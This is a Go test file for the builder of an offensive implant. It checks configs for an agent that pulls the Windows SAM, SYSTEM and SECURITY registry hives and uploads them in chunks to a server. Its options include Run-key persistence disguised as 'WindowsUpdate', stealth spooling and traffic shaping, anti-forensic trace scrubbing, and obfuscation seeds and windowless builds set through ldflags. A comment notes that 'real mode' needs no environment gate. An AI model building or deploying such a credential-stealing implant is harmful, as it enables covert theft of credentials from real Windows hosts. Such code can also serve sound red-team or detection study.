package main

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/ashwnn/adverse-go/internal/agent"
)

const stubTestSecret = "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"

func TestBuildAgentConfigJSON(t *testing.T) {
	opts := defaultAgentConfigOptions()
	opts.Secret = stubTestSecret
	opts.PersistenceMode = "none"

	raw, agentID, err := buildAgentConfigJSON(opts)
	if err != nil {
		t.Fatalf("buildAgentConfigJSON: %v", err)
	}
	if agentID != "247d08f3" {
		t.Fatalf("agent_id = %q, want first 4 bytes of sha256(secret) as hex", agentID)
	}
	if len(raw) == 0 || raw[0] != '{' || strings.Contains(string(raw), "\n") {
		t.Fatalf("config JSON must be compact std JSON, got %q", raw)
	}

	var cfg agent.Config
	if err := json.Unmarshal(raw, &cfg); err != nil {
		t.Fatalf("json.Unmarshal(agent.Config): %v", err)
	}
	if cfg.AgentID != agentID {
		t.Errorf("agent_id = %q, want %q", cfg.AgentID, agentID)
	}
	if cfg.Secret != stubTestSecret {
		t.Errorf("secret = %q, want %q", cfg.Secret, stubTestSecret)
	}
	if cfg.ServerURL != defaultServerURL {
		t.Errorf("server_url = %q, want %q", cfg.ServerURL, defaultServerURL)
	}
	if len(cfg.SignPubHex) != 64 {
		t.Errorf("sign_pub_hex = %q, want 64 hex chars", cfg.SignPubHex)
	}
	if !reflect.DeepEqual(cfg.Hives, []string{"SYSTEM", "SAM", "SECURITY"}) {
		t.Errorf("hives = %v, want SYSTEM,SAM,SECURITY", cfg.Hives)
	}
	if cfg.ChunkSize != 131072 {
		t.Errorf("chunk_size = %d, want 131072", cfg.ChunkSize)
	}
	if cfg.MinDelayMs != 5000 || cfg.MaxDelayMs != 15000 {
		t.Errorf("delays = %d..%d, want 5000..15000", cfg.MinDelayMs, cfg.MaxDelayMs)
	}
	if cfg.RealMode {
		t.Error("real_mode = true, want false (lab default)")
	}
	if cfg.TLSSkipVerify {
		t.Error("tls_skip_verify = true, want false (lab default)")
	}
	if cfg.UserAgent != "" {
		t.Errorf("user_agent = %q, want empty default", cfg.UserAgent)
	}
	if cfg.Persistence.Mode != "none" {
		t.Errorf("persistence.mode = %q, want explicit none (synthetic lab config)", cfg.Persistence.Mode)
	}
	if cfg.Persistence.RunKeyName != "" {
		t.Errorf("persistence.run_key_name = %q, want empty default", cfg.Persistence.RunKeyName)
	}
	if !cfg.Spool.Enabled {
		t.Error("spool.enabled = false, want true (stealth-first default)")
	}
	if cfg.Spool.Dir != "" {
		t.Errorf("spool.dir = %q, want empty default", cfg.Spool.Dir)
	}
	if !cfg.Shaping.Enabled {
		t.Error("shaping.enabled = false, want true (stealth-first default)")
	}
	if cfg.Shaping.UploadJitterMs != defaultUploadJitterMs {
		t.Errorf("shaping.upload_jitter_ms = %d, want %d", cfg.Shaping.UploadJitterMs, defaultUploadJitterMs)
	}
	if cfg.AntiForensic.ScrubTraces {
		t.Error("anti_forensic.scrub_traces = true, want false default")
	}
	if !cfg.ExitAfterDelivery {
		t.Error("exit_after_delivery = false, want true default")
	}
	if err := cfg.Validate(); err != nil {
		t.Fatalf("embedded config must validate: %v", err)
	}
}

func TestBuildAgentConfigStealthDefaults(t *testing.T) {
	opts := defaultAgentConfigOptions()
	opts.Secret = stubTestSecret
	opts.RealMode = true

	raw, _, err := buildAgentConfigJSON(opts)
	if err != nil {
		t.Fatalf("buildAgentConfigJSON: %v", err)
	}
	var cfg agent.Config
	if err := json.Unmarshal(raw, &cfg); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if cfg.Persistence.Mode != defaultPersistenceMode {
		t.Errorf("persistence.mode = %q, want default %q", cfg.Persistence.Mode, defaultPersistenceMode)
	}
	if cfg.Persistence.RunKeyName != "" {
		t.Errorf("persistence.run_key_name = %q, want empty default", cfg.Persistence.RunKeyName)
	}
	if !cfg.Spool.Enabled || cfg.Spool.Dir != "" {
		t.Errorf("spool defaults = %+v, want enabled with empty dir", cfg.Spool)
	}
	if !cfg.Shaping.Enabled || cfg.Shaping.UploadJitterMs != defaultUploadJitterMs {
		t.Errorf("shaping defaults = %+v, want enabled with jitter %d", cfg.Shaping, defaultUploadJitterMs)
	}
	if cfg.AntiForensic.ScrubTraces {
		t.Error("anti_forensic.scrub_traces = true, want false default")
	}
	if !cfg.ExitAfterDelivery {
		t.Error("exit_after_delivery = false, want true default")
	}
}

func TestBuildAgentConfigOptionsOverride(t *testing.T) {
	opts := defaultAgentConfigOptions()
	opts.Secret = stubTestSecret
	opts.ServerURL = "https://10.0.0.5:8443"
	opts.Hives = splitCSV("SAM")
	opts.ChunkSize = 4096
	opts.MinDelayMs = 50
	opts.MaxDelayMs = 100
	opts.TLSSkipVerify = true
	opts.UserAgent = "Mozilla/5.0"
	opts.PersistenceMode = "none"
	opts.Spool = false
	opts.SpoolDir = `C:\ProgramData\spool`
	opts.Shape = false
	opts.UploadJitterMs = 999
	opts.ExitAfterDelivery = false

	raw, _, err := buildAgentConfigJSON(opts)
	if err != nil {
		t.Fatalf("buildAgentConfigJSON: %v", err)
	}
	var cfg agent.Config
	if err := json.Unmarshal(raw, &cfg); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if cfg.ServerURL != opts.ServerURL || cfg.ChunkSize != 4096 || cfg.MinDelayMs != 50 || cfg.MaxDelayMs != 100 {
		t.Errorf("overrides not honored: %+v", cfg)
	}
	if !cfg.TLSSkipVerify || cfg.UserAgent != "Mozilla/5.0" {
		t.Errorf("tls/user-agent overrides not honored: %+v", cfg)
	}
	if cfg.Spool.Enabled || cfg.Spool.Dir != `C:\ProgramData\spool` {
		t.Errorf("spool overrides not honored: %+v", cfg.Spool)
	}
	if cfg.Shaping.Enabled || cfg.Shaping.UploadJitterMs != 999 {
		t.Errorf("shaping overrides not honored: %+v", cfg.Shaping)
	}
	if cfg.ExitAfterDelivery {
		t.Error("exit_after_delivery = true, want false override")
	}
}

func TestBuildAgentConfigPersistenceOverrides(t *testing.T) {
	opts := defaultAgentConfigOptions()
	opts.Secret = stubTestSecret
	opts.RealMode = true
	opts.PersistenceMode = "both"
	opts.RunKeyName = "WindowsUpdate"
	opts.ScrubTraces = true

	raw, _, err := buildAgentConfigJSON(opts)
	if err != nil {
		t.Fatalf("buildAgentConfigJSON: %v", err)
	}
	var cfg agent.Config
	if err := json.Unmarshal(raw, &cfg); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if cfg.Persistence.Mode != "both" || cfg.Persistence.RunKeyName != "WindowsUpdate" {
		t.Errorf("persistence overrides not honored: %+v", cfg.Persistence)
	}
	if !cfg.AntiForensic.ScrubTraces {
		t.Error("scrub_traces = false, want true override")
	}
}

// Real mode is a plain extraction-mode selector: it must generate a valid
// config with no environment gate.
func TestBuildAgentConfigRealModeSelector(t *testing.T) {
	opts := defaultAgentConfigOptions()
	opts.Secret = stubTestSecret
	opts.RealMode = true

	raw, _, err := buildAgentConfigJSON(opts)
	if err != nil {
		t.Fatalf("real_mode config build: %v", err)
	}
	var cfg agent.Config
	if err := json.Unmarshal(raw, &cfg); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if !cfg.RealMode {
		t.Error("real_mode = false, want true")
	}
	if cfg.Validate() != nil {
		t.Errorf("real_mode config must validate, got %v", cfg.Validate())
	}
}

func TestBuildLDFlags(t *testing.T) {
	cfgJSON := []byte(`{"agent_id":"247d08f3"}`)
	seed := "c4a906b1"
	flags := buildLDFlags(ldflagInputs{
		Version:    "0.2.0",
		GitCommit:  "deadbee",
		BuildTime:  "2026-09-10T12:00:00Z",
		ConfigJSON: cfgJSON,
		Seed:       seed,
	})

	want := []string{
		"-s -w -buildid=",
		"-X main.version=0.2.0",
		"-X main.gitCommit=deadbee",
		"-X main.buildTime=2026-09-10T12:00:00Z",
		"-X github.com/ashwnn/adverse-go/internal/agent.embeddedConfigB64=" + base64.StdEncoding.EncodeToString(cfgJSON),
		"-X github.com/ashwnn/adverse-go/internal/obfuscate.BuildSeed=" + seed,
		"-X github.com/ashwnn/adverse-go/internal/stealth.XorKeyHex=" + seed,
	}
	for _, w := range want {
		if !strings.Contains(flags, w) {
			t.Errorf("ldflags %q missing %q", flags, w)
		}
	}

	// The embedded value must decode back to the exact config JSON.
	const marker = "internal/agent.embeddedConfigB64="
	idx := strings.Index(flags, marker)
	if idx < 0 {
		t.Fatal("embedded config ldflag missing")
	}
	rest := flags[idx+len(marker):]
	end := strings.IndexByte(rest, ' ')
	if end < 0 {
		end = len(rest)
	}
	decoded, err := base64.StdEncoding.DecodeString(rest[:end])
	if err != nil {
		t.Fatalf("embedded config is not valid base64: %v", err)
	}
	if string(decoded) != string(cfgJSON) {
		t.Errorf("embedded config = %q, want %q", decoded, cfgJSON)
	}
}

func TestBuildLDFlagsWindowsGUI(t *testing.T) {
	base := ldflagInputs{
		Version:    "0.2.0",
		GitCommit:  "deadbee",
		BuildTime:  "2026-09-10T12:00:00Z",
		ConfigJSON: []byte(`{"agent_id":"247d08f3"}`),
		Seed:       "c4a906b1",
	}

	base.WindowsGUI = true
	withGUI := buildLDFlags(base)
	if !strings.Contains(withGUI, "-H windowsgui") {
		t.Errorf("buildLDFlags(WindowsGUI=true) = %q, want -H windowsgui", withGUI)
	}

	base.WindowsGUI = false
	withoutGUI := buildLDFlags(base)
	if strings.Contains(withoutGUI, "-H windowsgui") {
		t.Errorf("buildLDFlags(WindowsGUI=false) = %q, must not contain -H windowsgui", withoutGUI)
	}

	args := buildGoArgs("/tmp/stub.exe", withGUI)
	want := []string{"build", "-trimpath", "-o", "/tmp/stub.exe", "-ldflags", withGUI, "./cmd/registryfil"}
	if !reflect.DeepEqual(args, want) {
		t.Errorf("buildGoArgs with windowsgui ldflags = %v, want %v", args, want)
	}
}

func TestAgentConfigFlagDefaults(t *testing.T) {
	fs := flag.NewFlagSet("test", flag.ContinueOnError)
	flags := addAgentConfigFlags(fs, true)
	if err := flags.validate(); err != nil {
		t.Fatalf("default flags must validate: %v", err)
	}

	opts := defaultAgentConfigOptions()
	flags.apply(&opts)
	if opts.PersistenceMode != defaultPersistenceMode {
		t.Errorf("persistence default = %q, want %q", opts.PersistenceMode, defaultPersistenceMode)
	}
	if opts.RunKeyName != "" || opts.SpoolDir != "" {
		t.Errorf("run-key-name/spool-dir defaults = %q/%q, want empty", opts.RunKeyName, opts.SpoolDir)
	}
	if !opts.Spool || !opts.Shape {
		t.Errorf("spool/shape defaults = %v/%v, want true/true", opts.Spool, opts.Shape)
	}
	if opts.UploadJitterMs != defaultUploadJitterMs {
		t.Errorf("upload-jitter-ms default = %d, want %d", opts.UploadJitterMs, defaultUploadJitterMs)
	}
	if opts.ScrubTraces {
		t.Error("scrub-traces default = true, want false")
	}
	if !opts.ExitAfterDelivery {
		t.Error("exit-after-delivery default = false, want true")
	}

	// gen-agent registers the same flags but stays resident by default.
	fsAgent := flag.NewFlagSet("test-agent", flag.ContinueOnError)
	flagsAgent := addAgentConfigFlags(fsAgent, false)
	optsAgent := defaultAgentConfigOptions()
	flagsAgent.apply(&optsAgent)
	if optsAgent.ExitAfterDelivery {
		t.Error("gen-agent exit-after-delivery default = true, want false")
	}
}

func TestAgentConfigFlagOverrides(t *testing.T) {
	fs := flag.NewFlagSet("test", flag.ContinueOnError)
	flags := addAgentConfigFlags(fs, true)
	if err := fs.Parse([]string{
		"--persistence", "runkey",
		"--run-key-name", "WindowsUpdate",
		"--spool=false",
		"--spool-dir", `C:\spool`,
		"--shape=false",
		"--upload-jitter-ms", "0",
		"--scrub-traces",
		"--exit-after-delivery=false",
	}); err != nil {
		t.Fatalf("parse: %v", err)
	}
	if err := flags.validate(); err != nil {
		t.Fatalf("validate: %v", err)
	}

	opts := defaultAgentConfigOptions()
	flags.apply(&opts)
	if opts.PersistenceMode != "runkey" || opts.RunKeyName != "WindowsUpdate" {
		t.Errorf("persistence flags not applied: %+v", opts)
	}
	if opts.Spool || opts.SpoolDir != `C:\spool` || opts.Shape || opts.UploadJitterMs != 0 {
		t.Errorf("spool/shape flags not applied: %+v", opts)
	}
	if !opts.ScrubTraces || opts.ExitAfterDelivery {
		t.Errorf("scrub/exit flags not applied: %+v", opts)
	}
}

func TestAgentConfigFlagValidation(t *testing.T) {
	for _, mode := range []string{"none", "watchdog", "runkey", "both"} {
		if err := validatePersistenceMode(mode); err != nil {
			t.Errorf("validatePersistenceMode(%q) = %v, want nil", mode, err)
		}
	}
	for _, mode := range []string{"", "Watchdog", "registry", "run-key", "both "} {
		err := validatePersistenceMode(mode)
		if err == nil || !strings.Contains(err.Error(), "--persistence") {
			t.Errorf("validatePersistenceMode(%q) = %v, want clear error", mode, err)
		}
	}

	for _, ms := range []int{0, 1, 250, 60000} {
		if err := validateUploadJitter(ms); err != nil {
			t.Errorf("validateUploadJitter(%d) = %v, want nil", ms, err)
		}
	}
	if err := validateUploadJitter(-1); err == nil || !strings.Contains(err.Error(), "--upload-jitter-ms") {
		t.Errorf("validateUploadJitter(-1) = %v, want clear error", err)
	}

	fs := flag.NewFlagSet("test", flag.ContinueOnError)
	flags := addAgentConfigFlags(fs, false)
	if err := fs.Parse([]string{"--persistence", "bogus"}); err != nil {
		t.Fatalf("parse: %v", err)
	}
	if err := flags.validate(); err == nil {
		t.Error("flags.validate() with --persistence=bogus = nil, want error")
	}
}

func TestResolveSeed(t *testing.T) {
	got, err := resolveSeed("AABBCCDD")
	if err != nil {
		t.Fatalf("resolveSeed(AABBCCDD): %v", err)
	}
	if got != "aabbccdd" {
		t.Errorf("seed = %q, want lowercased aabbccdd", got)
	}

	for _, bad := range []string{"xyz", "aabbcc", "aabbccddee", "0x1234", "1234567g"} {
		if _, err := resolveSeed(bad); err == nil {
			t.Errorf("resolveSeed(%q) = nil error, want rejection", bad)
		}
	}

	random, err := resolveSeed("")
	if err != nil {
		t.Fatalf("resolveSeed(random): %v", err)
	}
	if !seedRe.MatchString(random) {
		t.Errorf("random seed %q is not 8 hex chars", random)
	}
}

func TestOutputPath(t *testing.T) {
	if got := outputPath("", "5f5a7b2c"); got != "stub-5f5a7b2c.exe" {
		t.Errorf("default output = %q, want stub-5f5a7b2c.exe", got)
	}
	if got := outputPath("  ", "5f5a7b2c"); got != "stub-5f5a7b2c.exe" {
		t.Errorf("blank output = %q, want stub-5f5a7b2c.exe", got)
	}
	if got := outputPath("/tmp/agent.exe", "5f5a7b2c"); got != "/tmp/agent.exe" {
		t.Errorf("explicit output = %q, want /tmp/agent.exe", got)
	}
}

func TestDetectModuleRootExplicit(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "go.mod"), []byte("module github.com/ashwnn/adverse-go\n\ngo 1.24\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	sub := filepath.Join(root, "cmd", "adversed")
	if err := os.MkdirAll(sub, 0o700); err != nil {
		t.Fatal(err)
	}

	got, err := detectModuleRoot(root)
	if err != nil {
		t.Fatalf("detectModuleRoot(root): %v", err)
	}
	if got != root {
		t.Errorf("detectModuleRoot(root) = %q, want %q", got, root)
	}

	if walkRoot, ok := walkUpForModule(sub); !ok || walkRoot != root {
		t.Errorf("walkUpForModule(%q) = %q,%v, want %q,true", sub, walkRoot, ok, root)
	}
}

func TestDetectModuleRootRejectsNonModule(t *testing.T) {
	dir := t.TempDir()
	if _, err := detectModuleRoot(dir); err == nil {
		t.Fatal("detectModuleRoot(non-module dir) = nil error, want failure")
	}

	other := t.TempDir()
	if err := os.WriteFile(filepath.Join(other, "go.mod"), []byte("module example.com/other\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := detectModuleRoot(other); err == nil {
		t.Fatal("detectModuleRoot(wrong module) = nil error, want failure")
	}
	if _, ok := walkUpForModule(other); ok {
		t.Fatal("walkUpForModule found the wrong module")
	}
}

func TestResolveGo(t *testing.T) {
	if _, err := resolveGo("/definitely/not/a/go/tool/xyz"); err == nil {
		t.Error("resolveGo(bogus) = nil error, want failure")
	}
	path, err := resolveGo("")
	if err != nil {
		t.Fatalf("resolveGo(default): %v", err)
	}
	if path == "" {
		t.Error("resolveGo(default) returned empty path")
	}
}

func TestBuildGoArgs(t *testing.T) {
	got := buildGoArgs("/tmp/stub.exe", "-s -w")
	want := []string{"build", "-trimpath", "-o", "/tmp/stub.exe", "-ldflags", "-s -w", "./cmd/registryfil"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("buildGoArgs = %v, want %v", got, want)
	}
}

func TestWithEnvOverrides(t *testing.T) {
	got := withEnv([]string{"GOOS=linux", "PATH=/bin", "CGO_ENABLED=1"}, "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	counts := map[string]int{}
	for _, e := range got {
		key := e[:strings.IndexByte(e, '=')]
		counts[key]++
	}
	for _, key := range []string{"GOOS", "GOARCH", "CGO_ENABLED", "PATH"} {
		if counts[key] != 1 {
			t.Errorf("env key %s appears %d times, want 1 (env=%v)", key, counts[key], got)
		}
	}
	if !strings.Contains(strings.Join(got, "\n"), "GOOS=windows") {
		t.Errorf("GOOS override missing: %v", got)
	}
}
